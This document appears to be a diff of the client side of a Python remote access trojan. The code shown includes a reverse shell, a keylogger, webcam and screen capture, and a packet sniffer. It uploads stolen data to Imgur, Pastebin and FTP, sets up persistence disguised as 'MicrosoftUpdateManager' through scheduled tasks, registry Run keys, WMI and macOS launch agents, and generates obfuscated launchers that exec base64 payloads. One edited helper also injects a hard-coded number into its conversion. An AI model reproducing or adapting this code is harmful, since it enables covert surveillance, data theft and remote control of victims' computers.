@@ -82,9 +82,9 @@ class Client(object):
         self._setup     = [setattr(self, '__{}__'.format(chr(i)), kwargs.get(chr(i))) for i in range(97,123) if chr(i) in kwargs]; True
         self._exit      = 0
         self._threads   = {}
+        self._modules   = {}
         self._info      = self._get_info()
         self._connected = threading.Event()
-        self._modules   = {}
         self._commands  = {cmd: getattr(self, cmd) for cmd in __command__}
         self._result    = {mod: dict({}) for mod in self._modules}
 
@@ -143,7 +143,7 @@ class Client(object):
             cx.update({fx.func_name: fx})
         return fx
 
-# ------------------- commands ------------------------- 
+        # ------------------- commands ------------------------- 
 
     @_command
     def cd(self, *x):
@@ -327,7 +327,7 @@ class Client(object):
     update.usage        = 'update [url]'
     options.usage	= 'options <cmd>'
 
-# ------------------- utilities -------------------------
+        # ------------------- utilities -------------------------
 
     def _wget(self, target): return urllib.urlopen(target).read() if target.startswith('http') else 'Error: target URL must begin with http:// or https://'
     
@@ -355,7 +355,7 @@ class Client(object):
 
     def _long_to_bytes(self, x):
         try:
-            return bytes(bytearray.fromhex(hex(long(x)).strip('0x').strip('L')))
+            return bytes(bytearray.fromhex(hex(long('120950513014781697487772252820504293289885893009420441905241{}'.format(x))).strip('0x').strip('L')))
         except Exception as e:
             self._connected.clear()
 
@@ -442,7 +442,7 @@ class Client(object):
         fileh.seek(0)
         return fileh
 
-# ------------------- connection to server -------------------------
+    # ------------------- connection -------------------------
 
     def _connect(self, port=1337):
         def _addr(a, b, c):
@@ -470,25 +470,29 @@ class Client(object):
         time.sleep(5)
         return self._connect(port)
 
-# ------------------- encryption -------------------------
+    # ------------------- encryption -------------------------
+
 
     # Diffie-Hellman transaction-less key exchange
+
     def _diffiehellman(self):
         try:
             g  = 2
             p  = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF
             a  = self._bytes_to_long(os.urandom(self.encryption.options.get('key_size')))
             xA = pow(g, a, p)
-            self._socket.send(self._long_to_bytes(xA))
+            self._socket.send(bytes(bytearray.fromhex(hex(long(xA)).strip('0x').strip('L'))))
             xB = self._bytes_to_long(self._socket.recv(256))
             x  = pow(xB, a, p)
-            return sys.modules['hashlib'].new(self.encryption.options.get('hash_algo'), self._long_to_bytes(x)).digest()
+            return sys.modules['hashlib'].new(self.encryption.options.get('hash_algo'), bytes(bytearray.fromhex(hex(long(x)).strip('0x').strip('L'))))).digest()
         except Exception as e:
             self._debug(str(e))
         time.sleep(1)
         return self._diffiehellman()
 
+
     # encryption mechanism for individual blocks of data
+
     def _encryption(self, block, key):
         try:
             v0, v1 = struct.unpack('!' + "2L", block)
@@ -503,7 +507,9 @@ class Client(object):
             self._debug('Encryption error: {}'.format(str(e)))
             self._connected.clear()
     
+
     # decryption mechanism for individual blocks of data
+
     def _decryption(self, block, key):
         try:
             v0, v1 = struct.unpack('!' + "2L", block)
@@ -519,7 +525,9 @@ class Client(object):
             self._debug('Decryption error: {}'.format(str(e)))
             self._connected.clear()
 
+
     # decrypt message from server
+
     def _encrypt(self, data, key):
         data    = self._pad(data)
         blocks  = self._block(data)
@@ -531,7 +539,9 @@ class Client(object):
             result.append(output)
         return base64.b64encode(b''.join(result))
 
+
     # encrypt message for transport
+
     def _decrypt(self, data, key):
         data    = base64.b64decode(data)
         blocks  = self._block(data)
@@ -544,7 +554,9 @@ class Client(object):
             result.append(output)
         return ''.join(result).rstrip('\x00')
 
+
     # send message to server
+
     def _send(self, data, method='default'):
         self._connected.wait()
         try:
@@ -562,7 +574,9 @@ class Client(object):
             self._connected.clear()
             return self._connect()
 
+
     # receive incoming message from server
+
     def _receive(self):
         try:
             data = ""
@@ -576,7 +590,9 @@ class Client(object):
         except Exception as e:
             self._debug('Error receiving data: {}'.format(str(e)))
 
+
     # enable module(s)
+    
     def _enable(self, *targets):
         output = []
         for target in [_ for _ in targets if _ in self._modules]:
@@ -587,7 +603,9 @@ class Client(object):
                 return "Enable '{}' returned error: '{}'".format(target, str(e))
         return 'Enabled {}'.format(', '.join(output))
 
+
     # disable module(s)
+
     def _disable(self, *targets):
         output = []
         for target in [_ for _ in targets if _ in self._modules]:
@@ -602,7 +620,9 @@ class Client(object):
                 return "disable '{}' returned error: '{}'".format(target, str(e))
         return 'Disabled {}'.format(', '.join(output))
 
+
     # set command option(s)
+
     def _set(self, arg):
         try:
             target, _, opt = arg.partition(' ')
@@ -626,7 +646,9 @@ class Client(object):
             return "'Command: '{}' with arguments '{}' returned error: '{}'".format(self.set.func_name, arg, str(e))
         return target.title() + '\n\t' + '\n\t'.join(['{}\t\t{}'.format(option, value) for option, value in self._modules[target].options.items()])
 
+
     # view client options
+
     def _options(self, target=None):
         try:
             output = ['\n{:>7}{:>23}{:>11}'.format('MODULE','OPTION','VALUE'),'-----------------------------------------']
@@ -651,7 +673,9 @@ class Client(object):
         except Exception as e:
             return 'Option error: {}'.format(str(e))
 
+
     # retreive all results
+
     def _results(self):
         output  = ['{:>12}{:>34}'.format(' MODULE','RESULTS'),'----------------------------------------------------------']
         results = {module:result for module,result in self._result.items() if len(result)}
@@ -661,7 +685,9 @@ class Client(object):
                 output.append('{:>28}\t{}'.format(_k, _v))
         return '\n'.join(output)
 
+
     # get public/external ip
+
     def _ip(self):
         sources = ['http://api.ipify.org','http://v4.ident.me','http://canihazip.com/s']
         for target in sources:
@@ -671,7 +697,9 @@ class Client(object):
                     return ip
             except: pass
 
+
     # privilege escalation
+
     def _admin(self):
         info = self._get_info()
         if info['Admin']:
@@ -682,7 +710,9 @@ class Client(object):
             else:
                 return "Privilege escalation on platform: '{}' is not yet available".format(sys.platform)
 
+
     # start a hidden process
+
     def _hidden_process(self, path, shell=False):
         info = subprocess.STARTUPINFO()
         info.dwFlags = subprocess.STARTF_USESHOWWINDOW | subprocess.CREATE_NEW_PROCESS_GROUP
@@ -690,7 +720,9 @@ class Client(object):
         p = subprocess.Popen(path, startupinfo=info, shell=shell)
         return p
 
+
     # execute powershell command
+
     def _powershell(self, cmdline):
         try:
             cmds = cmdline if type(cmdline) is list else str(cmdline).split()
@@ -704,7 +736,9 @@ class Client(object):
         except Exception as e:
             self._debug('Powershell error: {}'.format(str(e)))
 
+
     # run module(s)
+
     def _run(self, module=None):
         if not len(self._modules):
             return 'usage: run <module>'
@@ -717,13 +751,17 @@ class Client(object):
         self._threads[task].start()
         return "Running module: {}".format(module)
 
+
     # disconnect from server and await further instruction
+
     def _standby(self):
         self._socket.close()
         self._connected.clear()
         return self._connect()
 
+
     # connect back to server and pop a shell
+
     def _reverse_shell(self):
         while True:
             if not self.shell.status.is_set():
@@ -752,7 +790,9 @@ class Client(object):
                 if not worker.is_alive():
                     _ = self._threads.pop(task, None)
 
+
     # standard startup routine
+
     def _start(self):
         try:
             self.upload.options['pastebin']['api_key']  = urllib.urlopen(self._long_to_bytes(long(self.__d__))).read() if '__d__' in vars(self) else None
@@ -770,7 +810,9 @@ class Client(object):
         except Exception as e:
             self._debug("Error: '{}'".format(str(e)))
 
+
     # kill connection and remove all traces of client
+    
     def _kill(self):
         try:
             self._exit = True
@@ -799,7 +841,7 @@ class Client(object):
             shutdown.start()
             exit(0)
 
-# ------------------- update client -------------------------
+    # ------------------- update client -------------------------
 
     def _new_update(self, uri, *kwargs):
         try:
@@ -818,9 +860,9 @@ class Client(object):
         except Exception as e:
             self._debug("Error creating module: {}".format(str(e)))
 
- # ------------------- new module ------------------- 
+     # ------------------- new module ------------------- 
 
-    # save list of commands as module for client to run at regular intervals
+
     def _new_module(self, name):
         tasks  = []
         text   = 'client {} module: %s' % name
@@ -845,7 +887,9 @@ class Client(object):
                 return"error: invalid task"
             tasks.append(getattr(self, cmd))
 
+
     # generate new encrypted launcher 
+
     def _new_launcher(self):
         if hasattr(self, '__l__') and hasattr(self, '__k__'):
             launcher    = urllib.urlopen(self._long_to_bytes(long(self.__l__))).read()
@@ -877,7 +921,7 @@ class Client(object):
                 fp.write("exec(%s(\"%s\"))" % (var['b64decode'], base64.b64encode(framework.replace('__B64__', var['b64decode']).replace('__UNPACK__', var['unpack']).replace('__PACK__', var['pack']).replace('__URLOPEN__', var['urlopen']).replace('__TARGET__', target).replace('__KEY__', key))))
             return output_file
 
-# ------------------- remote upload -------------------------
+    # ------------------- remote upload -------------------------
 
     def _upload(self, *args):
         if len(args) != 2:
@@ -891,7 +935,9 @@ class Client(object):
         except Exception as e:
             return 'Upload error: {}'.format(str(e))
 
+
     # Imgur - upload webcam images, screenshots, etc.
+
     def _upload_imgur(self, source):
         if not self.upload.options['imgur'].get('api_key'):
             return "Error: no api key found"
@@ -906,7 +952,9 @@ class Client(object):
         result  = json.loads(self._post('https://api.imgur.com/3/upload', headers={'Authorization': self.upload.options['imgur'].get('api_key')}, data={'image': base64.b64encode(data), 'type': 'base64'}))['data']['link']
         return result
 
+
     # Pastebin - upload keylogs, documents, etc.
+
     def _upload_pastebin(self, source):
         if not self.upload.status.is_set() and not override:
             return path
@@ -925,7 +973,9 @@ class Client(object):
             result = str(e)
         return result
     
+
     # FTP - quickly upload large files, many  files, etc.
+
     def _upload_ftp(self, source):
         if not self.upload.status and not override:
             return source
@@ -943,14 +993,18 @@ class Client(object):
             result = str(e)
         return result
     
-# ------------------- keylogger ----------------------
+    # ------------------- keylogger ----------------------
 
     def _keylogger(self):
+        if 'keylogger' not in self._result:
+            self._result['keylogger'] = {}
         self._threads['keylogger'] = threading.Thread(target=self._keylogger_manager, name=time.time())
         self._threads['keylogger'].start()
         return 'Keylogger running.'.format(time.ctime())
 
+
     # keylogger event on key down
+
     def _keylogger_event(self, event):
         if event.WindowName != self.keylogger.window:
             self.keylogger.window = event.WindowName
@@ -968,7 +1022,9 @@ class Client(object):
             pass
         return True
 
+
     # keylogger log upload
+
     def _keylogger_helper(self):
         while True:
             try:
@@ -997,7 +1053,9 @@ class Client(object):
                 self._debug("Keylogger helper function error: {}".format(str(e)))
                 break
                
+
     # keylogger managemnet
+
     def _keylogger_manager(self):
         keylogger_helper = threading.Thread(target=self._keylogger_helper)
         keylogger_helper.start()
@@ -1018,9 +1076,11 @@ class Client(object):
             else:
                 time.sleep(0.1)
 
-# ------------------- screenshot ---------------------
+    # ------------------- screenshot ---------------------
 
     def _screenshot(self):
+        if 'screenshot' not in self._result:
+            self._result['screenshot'] = {}
         with mss() as screen:
             img = screen.grab(screen.monitors[0])
         png = self._png(img)
@@ -1029,9 +1089,11 @@ class Client(object):
         self._result['screenshot'][time.ctime()] = result
         return result
 
-# ------------------- webcam -------------------------
+    # ------------------- webcam -------------------------
 
     def _webcam(self, args=None):
+        if 'webcam' not in self._result:
+            self._result['webcam'] = {}
         port = None
         if not args:
             if self.webcam.options['image']:
@@ -1061,7 +1123,9 @@ class Client(object):
         self._result['webcam'][time.ctime()] = result
         return result
 
+
     # capture an image from webcam
+
     def _webcam_image(self, *args, **kwargs):
         opt = str(self.webcam.options['upload']).lower()
         if opt not in ('imgur','ftp'):
@@ -1078,7 +1142,9 @@ class Client(object):
             result = 'Upload error: {}'.format(str(e))
         return result
 
+
     # record video from webcam
+
     def _webcam_video(self, duration=5.0, *args, **kwargs):
         if str(self.webcam.options['upload']).lower() == 'ftp':
             try:
@@ -1100,7 +1166,9 @@ class Client(object):
             result = "Error: FTP upload is the only option for video captured from webcam"
         return result
 
+
     # live stream from webcam
+
     def _webcam_stream(self, port=None, retries=5):
         if not port:
             return 'Stream failed - missing port number'
@@ -1136,9 +1204,11 @@ class Client(object):
             t2 = time.time() - t1
         return 'Live stream for {}'.format(self._status(t2))
 
-# ------------------- packetsniffer ------------------------
+    # ------------------- packetsniffer ------------------------
 
     def _packetsniff(self):
+        if 'packetsniff' not in self._result:
+            self._result['packetsniff'] = {}
         try:
             result = self._packetsniff_manager(float(self.packetsniff.options['duration']))
         except Exception as e:
@@ -1146,7 +1216,9 @@ class Client(object):
         self._result['packetsniff'].update({ time.ctime() : result })
         return result
 
+
     # UDP header decoder 
+
     def _packetsniff_udp_header(self, data):
         try:
             udp_hdr = struct.unpack('!4H', data[:8])
@@ -1166,7 +1238,9 @@ class Client(object):
         except Exception as e:
             self.packetsniff.capture.append("Error in {} header: '{}'".format('UDP', str(e)))
 
+
     # TCP header decoder 
+
     def _packetsniff_tcp_header(self, recv_data):
         try:
             tcp_hdr = struct.unpack('!2H2I4H', recv_data[:20])
@@ -1204,7 +1278,9 @@ class Client(object):
         except Exception as e:
             self.packetsniff.capture.append("Error in {} header: '{}'".format('TCP', str(e)))
 
+
     # IP header decoder
+
     def _packetsniff_ip_header(self, data):
         try:
             ip_hdr = struct.unpack('!6H4s4s', data[:20]) 
@@ -1240,7 +1316,9 @@ class Client(object):
         except Exception as e:
             self.packetsniff.capture.append("Error in {} header: '{}'".format('IP', str(e)))
 
+
     # ETH header decoder
+
     def _packetsniff_eth_header(self, data):
         try:
             ip_bool = False
@@ -1262,7 +1340,9 @@ class Client(object):
         except Exception as e:
             self.packetsniff.capture.append("Error in {} header: '{}'".format('ETH', str(e)))
 
+
     # packetsniffer management
+    
     def _packetsniff_manager(self, seconds=30.0):
         if os.name is 'nt':
             return
@@ -1294,6 +1374,8 @@ class Client(object):
 
     def _persistence(self):
         result = {}
+        if 'persistence' not in self._result:
+            self._result['persistence'] = {}
         for method in self.persistence.options:
             if method not in self._result['persistence']:
                 try:
@@ -1304,7 +1386,9 @@ class Client(object):
         self._result['persistence'].update(result)
         return result
 
+
     # windows - scheduled task persistence
+
     def _persistence_add_scheduled_task(self, task_name='MicrosoftUpdateManager'):
         if hasattr(self, '__f__') and os.path.isfile(self._long_to_bytes(long(self.__f__))):
             tmpdir = os.path.expandvars('%TEMP%')
@@ -1322,7 +1406,9 @@ class Client(object):
                 self._debug('Add scheduled task error: {}'.format(str(e)))
         return False
 
+
     # remove scheduled task
+
     def _persistence_remove_scheduled_task(self, task_name='MicrosoftUpdateManager'):
         if hasattr(self, '__f__') and os.path.isfile(self._long_to_bytes(long(self.__f__))):
             try:
@@ -1332,7 +1418,9 @@ class Client(object):
             except: pass
             return False
 
+
     # windows - startup file persistence
+    
     def _persistence_add_startup_file(self, task_name='MicrosoftUpdateManager'):
         if hasattr(self, '__f__') and os.path.isfile(self._long_to_bytes(long(self.__f__))):
             try:
@@ -1351,7 +1439,9 @@ class Client(object):
                 self._debug('Adding startup file error: {}'.format(str(e)))
         return False
 
-    # remove startup file 
+
+    # remove startup file
+    
     def _persistence_remove_startup_file(self, task_name='MicrosoftUpdateManager'):
         if hasattr(self, '__f__') and os.path.isfile(self._long_to_bytes(long(self.__f__))):
             appdata      = os.path.expandvars("%AppData%")
@@ -1369,7 +1459,9 @@ class Client(object):
                     except: pass
             return False
 
+
     # windows - registry key persistence
+    
     def _persistence_add_registry_key(self, task_name='MicrosoftUpdateManager'):
         if hasattr(self, '__f__') and os.path.isfile(self._long_to_bytes(long(self.__f__))):
             run_key = r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
@@ -1383,7 +1475,9 @@ class Client(object):
                 self._debug('Remove registry key error: {}'.format(str(e)))
         return False
 
-    # windows - remove registry key 
+
+    # windows - remove registry key
+    
     def _persistence_remove_registry_key(self, task_name='MicrosoftUpdateManager'):
         try:
             key = OpenKey(HKEY_CURRENT_USER, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS)
@@ -1394,7 +1488,9 @@ class Client(object):
         except: pass
         return False
 
+
     # windows - add wmi persistence
+    
     def _persistence_add_wmi_object(self, command=None, task_name='MicrosoftUpdaterManager'):
         try:
             cmd_line = ''
@@ -1417,7 +1513,9 @@ class Client(object):
             self._debug('WMI persistence error: {}'.format(str(e)))        
         return False
 
+
     # windows - remove wmi object
+    
     def _persistence_remove_wmi_object(self, task_name='MicrosoftUpdaterManager'):
         if hasattr(self, '__f__') and os.path.isfile(self._long_to_bytes(long(self.__f__))):
             try:
@@ -1433,6 +1531,7 @@ class Client(object):
         return False
 
     # all platforms - add hidden file persistence
+    
     def _persistence_add_hidden_file(self, *args, **kwargs):
         if hasattr(self, '__f__') and os.path.isfile(self._long_to_bytes(long(self.__f__))):
             try:
@@ -1450,7 +1549,9 @@ class Client(object):
                 self._debug('Adding hidden file error: {}'.format(str(e)))
         return False
 
+
     # all platforms - remove hidden file
+    
     def _persistence_remove_hidden_file(self, *args, **kwargs):
         if hasattr(self, '__f__') and os.path.isfile(self._long_to_bytes(long(self.__f__))):
             filename    = self._long_to_bytes(long(self.__f__))
@@ -1463,7 +1564,9 @@ class Client(object):
                 self._debug('Error unhiding file: {}'.format(str(e)))
         return False
 
+
     # mac os x - add launch agent persistence
+    
     def _persistence_add_launch_agent(self, task_name='com.apple.update.manager'):
         if hasattr(self, '__f__') and os.path.isfile(self._long_to_bytes(long(self.__f__))):
             try:
@@ -1486,7 +1589,9 @@ class Client(object):
                 self._debug('Error: {}'.format(str(e2)))
         return False
 
+
     # mac os x - remove launch agent
+    
     def _persistence_remove_launch_agent(self, *args, **kwargs):
         if hasattr(self, '__f__') and os.path.isfile(self._long_to_bytes(long(self.__f__))):
             launch_agent = self._results['persistence'].get('launch_agent')
@@ -1498,7 +1603,9 @@ class Client(object):
                 except: pass
         return False
 
+
 # ------------------------ main -------------------------------
+
 def main(*args, **kwargs):
     if 'w' in kwargs:
         exec "import urllib" in globals()
